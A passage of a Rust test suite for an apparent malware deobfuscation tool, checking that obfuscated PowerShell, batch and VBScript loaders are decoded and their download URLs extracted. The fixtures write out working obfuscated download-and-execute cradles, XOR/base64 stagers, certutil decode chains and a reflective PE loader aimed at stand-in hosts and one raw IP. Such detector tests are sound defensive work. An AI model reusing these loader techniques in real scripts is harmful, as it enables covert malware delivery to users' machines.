        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains(decoded),
            "for/Substring stride payload not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_smart_quote_url_concat() {
        let ps = concat!(
            "Invoke-WebRequest -Uri (",
            "\u{201D}http:\u{201D} + ",
            "\u{201D}//smart.example/a.ps1\u{201D}",
            ") -OutFile x.ps1"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("'http://smart.example/a.ps1'"),
            "smart-quoted URL concat not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_preserves_url_middle_segment_in_concat() {
        let normalized = crate::ps1_scan::normalize_ps1_text(
            "Invoke-WebRequest -Uri ('http' + '://x' + '.com')",
        );
        assert!(
            normalized.contains("'http://x.com'"),
            "URL concat lost middle segment:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_multi_chunk_char_array_concat_directly() {
        let ps = "Invoke-WebRequest -Uri (([char[]]@(104,116,116,112)-join '') + ([char[]]@(58,47,47,120)-join '') + ([char[]]@(46,99,111,109)-join ''))";
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("'http://x.com'"),
            "multi-chunk char-array concat not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_string_join_char_array() {
        let chars = "https://string-join-char-array.example/stage.ps1"
            .chars()
            .map(|ch| u32::from(ch).to_string())
            .collect::<Vec<_>>()
            .join(",");
        let ps = format!("iex ([string]::Join('', [char[]]({chars})))");

        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);

        assert!(
            normalized.contains("https://string-join-char-array.example/stage.ps1"),
            "string Join char-array call was not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_unary_join_char_array() {
        let chars = "https://unary-join-char-array.example/stage.ps1"
            .chars()
            .map(|ch| u32::from(ch).to_string())
            .collect::<Vec<_>>()
            .join(",");
        let ps = format!("iex (-join [char[]]({chars}))");

        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);

        assert!(
            normalized.contains("https://unary-join-char-array.example/stage.ps1"),
            "unary join char-array call was not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_variable_index_concat_assignment() {
        let ps = "$ROOMS='UJDYFNDHSINSHYEXHJPJAQRNFLSXAWJ';$NEXT=$ROOMS[9]+$ROOMS[14]+$ROOMS[15];&$NEXT (Invoke-WebRequest 1297338337/x.jpg)";
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$NEXT='Invoke-Expression'")
                && normalized.contains("&'Invoke-Expression' (Invoke-WebRequest 1297338337/x.jpg)"),
            "indexed variable concat not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_new_item_skip_nth_function() {
        let ps = concat!(
            "(New-Item -Path function: -Name fordlet -Value { ",
            "param ($Besa);$flleseje=3;do {$out+=$Besa[$flleseje];$flleseje+=4} until(!$Besa[$flleseje]);$out",
            "});$sep=fordlet 'Und>';$urls='http://a>x'.Split($sep)"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$sep='>'") && normalized.contains("'http://a>x'.Split('>')"),
            "New-Item skip-nth function was not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_inlines_invoke_expression_wrapper_function() {
        let ps = concat!(
            "(New-Item -Path function: -Name RunIt -Value { param ($x); .('Invoke-Expression') ($x) });",
            "$sep='>';RunIt ('$global:urls=''http://a>http://b''.Split($sep)')"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$global:urls='http://a>http://b'.Split('>')"),
            "Invoke-Expression wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_inlines_variable_invoke_expression_wrapper_function() {
        let ps = concat!(
            "$cmd='Invoke-Expression';",
            "(New-Item -Path function: -Name RunIt -Value { param ($x); .($cmd) ($x) });",
            "RunIt ('$global:stage=''ok''')"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$global:stage='ok'"),
            "variable Invoke-Expression wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_inlines_new_item_alias_invoke_expression_wrapper() {
        let ps = concat!(
            "$fn='function:';",
            "(n`i -p $fn -n Havfrues202 -value {param ($x);.('Invoke-Expression') ($x)});",
            "Havfrues202 ('$global:stage=1')"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$global:stage=1"),
            "New-Item alias Invoke-Expression wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_inlines_wrapper_after_decoding_invoker_name() {
        fn stride_carrier(decoded: &str, start: usize, step: usize) -> String {
            let len = start + decoded.chars().count() * step;
            let mut chars = vec!['x'; len];
            for (idx, c) in decoded.chars().enumerate() {
                chars[start + idx * step] = c;
            }
            chars.into_iter().collect()
        }

        let carrier = stride_carrier("Invoke-Expression", 3, 4);
        let ps = format!(
            "(n`i -p function: -n fordlet -value {{param ($x);$i=3;do {{$o+=$x[$i];$i+=4}} until(!$x[$i])$o}});$cmd=fordlet '{carrier}';(n`i -p function: -n RunIt -value {{param ($x);.($cmd) ($x)}});RunIt ('$global:stage=1')"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
        assert!(
            normalized.contains("$global:stage=1"),
            "chained decoded Invoke-Expression wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_inlines_generated_havfrues_wrapper_call() {
        let ps = concat!(
            "(n`i  -p $Fordelingsprincippet -n Havfrues202 -value {param ($Frostsikrendes);.($manchetskjortes) ($Frostsikrendes)});",
            "$manchetskjortes='Invoke-Expression';",
            "Havfrues202 ('$gLOBAl:upbroKeN=$EnV:aPpdATA+$SvAMpekolONi179')"
        );
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$gLOBAl:upbroKeN=$EnV:aPpdATA+$SvAMpekolONi179")
                && !normalized.contains("Havfrues202 ('$gLOBAl"),
            "generated Havfrues wrapper call was not inlined:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_unescapes_backslash_quotes() {
        let ps = r#"Invoke-Expression(New-Object Net.WebClient).DownloadString(\"http://quoted.example/a.ps1\")"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains(r#"DownloadString("http://quoted.example/a.ps1")"#),
            "backslash-escaped quotes were not normalized:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_collapses_single_literal_join() {
        let ps =
            r#"$method=('DownloadString' -join ''); $url=('https://readable.example/a' -join '')"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$method='DownloadString'")
                && normalized.contains("$url='https://readable.example/a'"),
            "single-literal join was not collapsed:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_collapses_double_quoted_single_literal_join() {
        let ps = r#"$method=("DownloadString" -join ""); $url=("https://readable-dq.example/a" -join "")"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$method='DownloadString'")
                && normalized.contains("$url='https://readable-dq.example/a'"),
            "double-quoted single-literal join was not collapsed:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_preserves_variable_name_on_append_assignment_lhs() {
        let ps = r#"$client='Net.w';$client+='EBClIeNT';$url='https://readable.example/a';Invoke-WebRequest -Uri $url"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("$client+='EBClIeNT'")
                && !normalized.contains("'Net.w'+='EBClIeNT'"),
            "append assignment LHS was rewritten incorrectly:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_reversed_string_slice_join() {
        let ps = r#"[Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('AAAA');[Reflection.Assembly]::('daoL'[-1..-4] -join '')($b)"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("[Convert]::'FromBase64String'('AAAA')")
                && normalized.contains("[Reflection.Assembly]::'Load'($b)"),
            "reversed string slice join not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_double_quoted_reversed_string_slice_join() {
        let ps = r#"[Convert]::("gnirtS46esaBmorF"[-1..-16] -join "")('AAAA');[Reflection.Assembly]::("daoL"[-1..-4] -join "")($b)"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized.contains("[Convert]::'FromBase64String'('AAAA')")
                && normalized.contains("[Reflection.Assembly]::'Load'($b)"),
            "double-quoted reversed string slice join not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_tochararray_reverse_join() {
        let ps = r#"$p='exe.loPsaC\91303.0.4v\krowemarF\TEN.tfosorciM\swodniW\:C';$chars=$p.ToCharArray();[array]::Reverse($chars);$path=-join($chars);Start-Process $path"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized
                .contains("$path='C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'")
                && normalized.contains(
                    "Start-Process 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'"
                ),
            "ToCharArray reverse join not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_double_quoted_tochararray_reverse_join() {
        let ps = r#"$p="exe.loPsaC\91303.0.4v\krowemarF\TEN.tfosorciM\swodniW\:C";$chars=$p.ToCharArray();[array]::Reverse($chars);$path=-join($chars);Start-Process $path"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized
                .contains("$path='C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'")
                && normalized.contains(
                    "Start-Process 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'"
                ),
            "double-quoted ToCharArray reverse join not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_normalization_decodes_interleaved_literal_reverse_join() {
        let ps = r#"$p='exe.loPsaC\91303.0.4v\krowemarF\TEN.tfosorciM\swodniW\:C';Write-Host 1;$chars=$p.ToCharArray();Write-Host 2;[array]::Reverse($chars);Write-Host 3;$path=-join($chars);Start-Process $path"#;
        let normalized = crate::ps1_scan::normalize_ps1_text(ps);
        assert!(
            normalized
                .contains("$path='C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'")
                && normalized.contains(
                    "Start-Process 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\CasPol.exe'"
                ),
            "interleaved ToCharArray reverse join not decoded:\n{}",
            normalized
        );
    }

    #[test]
    fn ps1_self_read_marker_base64_payload_is_extracted() {
        use base64::Engine;
        let payload = "$u='https://selfread.example/FLEE.ps1'; Invoke-WebRequest -Uri $u";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"@echo off
powershell -NoP -C "try {{ $Natural = (Get-Content '%~f0') -join [Environment]::NewLine; if ($Natural -match '@rem N86fApRRJbKo4XPoI([A-Za-z0-9+/=]+)') {{ [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) | iex }} }} catch {{}}"
@rem N86fApRRJbKo4XPoI{b64}
"#
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://selfread.example/FLEE.ps1")),
            "embedded self-read payload was not normalized:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("selfread.example/FLEE.ps1"))
            }),
            "embedded self-read payload URL was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_self_read_tail_base64_payload_is_extracted() {
        use base64::Engine;
        let payload = "$u='https://selftail.example/FLEE.ps1'; Invoke-WebRequest -Uri $u";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"@echo off
powershell -NoP -C "$p='';$r=-{len}..-1;$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content $p -Raw)[$r]));iex $s"
exit
{b64}
"#,
            len = b64.len()
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://selftail.example/FLEE.ps1")),
            "tail self-read payload was not normalized:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("selftail.example/FLEE.ps1"))
            }),
            "tail self-read payload URL was not extracted: {:?}",
            report.traits
        );
        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted self-tail base64 payload"),
            "tail payload was not summarized in deobfuscated output:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains(&b64),
            "duplicate tail payload was left in deobfuscated output"
        );
    }

    #[test]
    fn ps1_self_read_tail_reversed_gzip_pe_is_recovered() {
        use base64::Engine;
        use std::io::Write as _;

        let url = "https://selftail-pe.example/payload";
        let mut pe = vec![0u8; 0x200];
        pe[0..2].copy_from_slice(b"MZ");
        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe.extend_from_slice(url.as_bytes());
        let mut reversed = pe.clone();
        reversed.reverse();
        let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        gz.write_all(&reversed).unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(gz.finish().unwrap());
        let ps = r#"$x=[IO.File]::ReadLines(([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.ToString()+".bat"),[text.encoding]::UTF8) | Select-Object -last 1;$b=[Convert]::FromBase64String($x);$m=New-Object System.IO.MemoryStream(,$b);$o=New-Object System.IO.MemoryStream;$g=New-Object System.IO.Compression.GzipStream $m,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);[byte[]]$p=$o.ToArray();[Array]::Reverse($p);[System.Reflection.Assembly]::Load($p)"#;
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let encoded_ps = base64::engine::general_purpose::STANDARD.encode(utf16);
        let script = format!("powershell -enc {encoded_ps}\r\nexit\r\n{b64}\r\n");

        let report = analyze(script.as_bytes(), &Config::default());

        assert!(
            report.recovered_pe.iter().any(|(label, bytes)| label
                .starts_with("ps1-self-tail-reversed-gzip-pe")
                && bytes.starts_with(b"MZ")),
            "reversed gzip PE was not recovered: {:?}",
            report.recovered_pe
        );
        assert!(
            report
                .traits
                .iter()
                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
            "recovered PE URL was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn capped_ps1_self_read_tail_base64_payload_is_summarized() {
        use base64::Engine;
        let payload = format!(
            "$u='https://selftail-long.example/FLEE.ps1'; Invoke-WebRequest -Uri $u;#{}",
            "A".repeat(110_000)
        );
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            r#"@echo off
powershell -NoP -C "$p='';$r=-{len}..-1;$s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content $p -Raw)[$r]));iex $s"
exit
{b64}
"#,
            len = b64.len()
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://selftail-long.example/FLEE.ps1")),
            "tail self-read payload was not normalized"
        );
        assert!(
            report
                .deobfuscated
                .contains("harrington: omitted self-tail base64 payload"),
            "capped tail payload was not summarized:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains("…[truncated]"),
            "capped duplicate tail payload remained in deobfuscated output"
        );
    }

    #[test]
    fn ps1_file_backed_base64_xor_loader_is_extracted() {
        use base64::Engine;
        let payload = "Invoke-WebRequest -Uri https://xorloader.example/stage.ps1";
        let encrypted: Vec<u8> = payload
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .map(|b| b ^ 253)
            .collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
        let script = format!(
            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=(gc '%TEMP%\\\\stage.dat') -join '';$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://xorloader.example/stage.ps1")),
            "file-backed xor stage was not normalized:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("xorloader.example/stage.ps1"))
            }),
            "file-backed xor stage URL was not extracted: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps1_sorted_comment_chunks_are_extracted() {
        let script = concat!(
            ":: 030000000002eadable.example/a.ps1\r\n",
            ":: 030000000001Invoke-WebRequest -Uri https://r\r\n",
            "\"%~0.exe\" -Command \"$lines=[IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);",
            "$hits=New-Object Collections.Generic.List[string];",
            "foreach($line in $lines){if($line.StartsWith(':: 03')){$hits.Add($line.Substring(5));}}",
            "$sorted=$hits | Sort-Object { $_.Substring(0, 10) };",
            "for($i=0;$i -lt $sorted.Count;$i++){$sorted[$i]=$sorted[$i].Substring(10);}",
            "$stage=$sorted -join ''; %~f0.exe -command $stage;\"\r\n",
        );
        let report = analyze(script.as_bytes(), &Config::default());
        assert!(
            report
                .extracted_ps1_normalized
                .iter()
                .any(|ps| ps.contains("https://readable.example/a.ps1")),
            "sorted comment stage was not extracted:\n{:?}",
            report.extracted_ps1_normalized
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(t, Trait::Download { src, .. } if src.contains("readable.example/a.ps1"))
            }),
            "sorted comment URL was not extracted: {:?}",
            report.traits
        );
    }

    /// `[char]` cast + concatenation assembles a URL from codepoints.
    /// Our `expand_char_concat` regex handles this without minusone.
    ///
    /// "https://x.com" in decimal codepoints:
    ///   h=104 t=116 t=116 p=112 s=115 :=58 /=47 /=47 x=120 .=46 c=99 o=111 m=109
    #[test]
    fn char_concat_resolves_url() {
        use base64::Engine;
        let ps = r#"Invoke-WebRequest -Uri ([char]104+[char]116+[char]116+[char]112+[char]115+[char]58+[char]47+[char]47+[char]120+[char]46+[char]99+[char]111+[char]109)"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            ps.encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("https://x.com")
            )
        });
        assert!(
            has,
            "char-cast-concat not deobfuscated: {:?}",
            report.traits
        );
    }

    #[test]
    fn char_concat_arithmetic_resolves_url() {
        use base64::Engine;
        let ps = r#"Invoke-WebRequest -Uri ([char](100+4)+[char](120-4)+[char](0x70+4)+[char](0x70)+[char](110+5)+[char](60-2)+[char](40+7)+[char](40+7)+[char](120)+[char](50-4)+[char](90+9)+[char](100+11)+[char](100+9))"#;
        let b64 = base64::engine::general_purpose::STANDARD.encode(
            ps.encode_utf16()
                .flat_map(|c| c.to_le_bytes())
                .collect::<Vec<_>>(),
        );
        let script = format!("powershell -EncodedCommand {}\r\n", b64);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("https://x.com")
            )
        });
        assert!(
            has,
            "arithmetic char-cast-concat not deobfuscated: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod recursive_payload_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};
    use base64::Engine;

    #[test]
    fn certutil_decode_chain_recurses() {
        // The decoded payload is itself a batch script with a curl call
        let inner_bat = "curl -o evil.exe http://x.example/payload.exe\r\n";
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner_bat.as_bytes());
        // Build a parent script that:
        //  - Echoes the b64 into src.b64 via a leading-redirect echo
        //  - certutil -decode src.b64 dst.bat
        let mut script = String::new();
        script.push_str(&format!(">src.b64 echo {}\r\n", b64));
        script.push_str("certutil -decode src.b64 dst.bat\r\n");
        let report = analyze(script.as_bytes(), &Config::default());
        // The inner curl URL should surface as a Download trait
        let has = report.traits.iter().any(
            |t| matches!(t, Trait::Download { src, .. } if src.contains("x.example/payload.exe")),
        );
        assert!(has, "no inner Download trait surfaced: {:?}", report.traits);
        let has_rec = report
            .traits
            .iter()
            .any(|t| matches!(t, Trait::RecursiveAnalysis { .. }));
        assert!(has_rec, "no RecursiveAnalysis trait");
    }

    #[test]
    fn certutil_decode_chain_from_inline_echo_redirect_resolves() {
        let inner_bat = "curl -o evil.exe http://x.example/inline.exe\r\n";
        let b64 = base64::engine::general_purpose::STANDARD.encode(inner_bat.as_bytes());
        let script = format!("echo {b64}>src.b64\r\ncertutil -decode src.b64 dst.bat\r\n");
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(
            |t| matches!(t, Trait::Download { src, .. } if src.contains("x.example/inline.exe")),
        );
        assert!(
            has,
            "inline echo certutil chain missed: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps1_var_substitution_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn ps_variable_resolves_to_url() {
        let inner = r#"$u = 'http://evil.example/x.exe'; Invoke-WebRequest -Uri $u -OutFile c.exe"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/x.exe")
            )
        });
        assert!(has, "no Download trait from $u var: {:?}", report.traits);
    }

    #[test]
    fn ps_double_quoted_variable_resolves_to_url() {
        let inner =
            r#"$u = "https://evil.example/dq.exe"; Invoke-WebRequest -Uri $u -OutFile c.exe"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/dq.exe")
            )
        });
        assert!(
            has,
            "no Download trait from double-quoted $u var: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps_variable_concat_assigned_resolves() {
        let inner = r#"$u = 'http://' + 'evil.example/' + 'y'; Invoke-WebRequest $u"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.example/y")
            )
        });
        assert!(has, "no Download from concat-assigned: {:?}", report.traits);
    }

    #[test]
    fn ps_uri_concat_with_bound_variables_resolves() {
        let inner = r#"$botToken = '123:abc'; $chatId = '777'; Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $botToken + '/sendMessage?chat_id=' + $chatId) -Method Get"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("api.telegram.org/bot123:abc/sendMessage?chat_id=777")
            )
        });
        assert!(
            has,
            "no Download from URI concat with vars: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps_command_concat_from_bound_variables_resolves_downloadstring() {
        let inner = r#"$var1='(New-Ob';$var2='ject Net.Web';$var3='Client)';$var4='.DownloadString(';$var5='''http://92.255.85.2/a.mp4''';$var6=')';$command=$var1+$var2+$var3+$var4+$var5+$var6;IEX $command|IEX"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "http://92.255.85.2/a.mp4"
            )
        });
        assert!(
            has,
            "no Download from command concat DownloadString: {:?}",
            report.traits
        );
        let generic_count = report
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "http://92.255.85.2/a.mp4")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "command concat URL double-emitted: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_replace_join_tests {
    use crate::traits::Trait;
    use crate::{analyze, Config};

    #[test]
    fn ps_replace_chain_resolves() {
        let inner = r#"Invoke-WebRequest -Uri ('Xttp://evil.example/y' -replace 'X','h')"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("http://evil.example/y")
            )
        });
        assert!(has, "no Download after -replace: {:?}", report.traits);
    }

    #[test]
    fn ps_join_array_resolves() {
        let inner =
            r#"Invoke-WebRequest ('h','t','t','p','s',':','/','/','x','.','c','o','m' -join '')"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("https://x.com")
            )
        });
        assert!(has, "no Download after -join: {:?}", report.traits);
    }

    #[test]
    fn ps_join_double_quoted_array_resolves() {
        let inner = r#"Invoke-WebRequest ("h","t","t","p","s",":","/","/","ps-join-dq.example","/stage" -join "")"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://ps-join-dq.example/stage"
            )
        });
        assert!(
            has,
            "no Download after double-quoted -join: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps_array_subexpression_variable_join_resolves() {
        let inner = r#"$p=@('https://','ps-array-var.example','/stage');$u=$p -join '';Invoke-WebRequest $u"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("https://ps-array-var.example/stage")
            )
        });
        assert!(
            has,
            "no Download after @() array variable join: {:?}",
            report.traits
        );
    }

    #[test]
    fn ps_double_quoted_array_variable_join_resolves() {
        let inner = r#"$p=@("https://","ps-array-var-dq.example","/stage");$u=$p -join "";Invoke-WebRequest $u"#;
        let script = format!("powershell -Command \"{}\"\r\n", inner);
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://ps-array-var-dq.example/stage"
            )
        });
        assert!(
            has,
            "no Download after double-quoted @() array variable join: {:?}",
            report.traits
        );
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod vbs_url_extraction_tests {
    use crate::env::{Config, Environment};
    use crate::traits::Trait;
    use crate::{analyze, Config as AnalyzeConfig};

    #[test]
    fn vbs_xmlhttp_url_extracted_direct() {
        let mut env = Environment::new(&Config::default());
        let vbs = b"Set http = CreateObject(\"MSXML2.XMLHTTP\")\r\nhttp.Open \"GET\", \"http://evil.vbs/x.exe\", False\r\nhttp.Send";
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src.contains("evil.vbs/x.exe")
            )
        });
        assert!(has, "no Download trait: {:?}", env.traits);
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_variable() {
        let mut env = Environment::new(&Config::default());
        let vbs = b"Dim noncatalog, http\r\nnoncatalog = \"https://vbs.example/payload.txt\"\r\nSet http = CreateObject(\"MSXML2.XMLHTTP\")\r\nhttp.Open \"GET\", noncatalog, False\r\nhttp.Send";
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://vbs.example/payload.txt"
            )
        });
        assert!(
            has,
            "no Download trait from VBS variable URL: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_savetofile_concat_destination_extracted() {
        let mut env = Environment::new(&Config::default());
        let vbs = br#"Dim http, stream, out
out = "C:\Users\Public\" & "drop.exe"
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://vbs.example/drop.bin", False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.SaveToFile out, 2"#;
        env.all_extracted_vbs.push(vbs.to_vec());
        crate::vbs_scan::scan_vbs_payloads(&mut env);
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://vbs.example/drop.bin"
                        && dst.as_deref() == Some("C:\\Users\\Public\\drop.exe")
            )
        });
        assert!(
            has,
            "no VBS Download destination from SaveToFile concat: {:?}",
            env.traits
        );
    }

    #[test]
    fn vbs_xmlhttp_url_extracted_from_const_variable() {
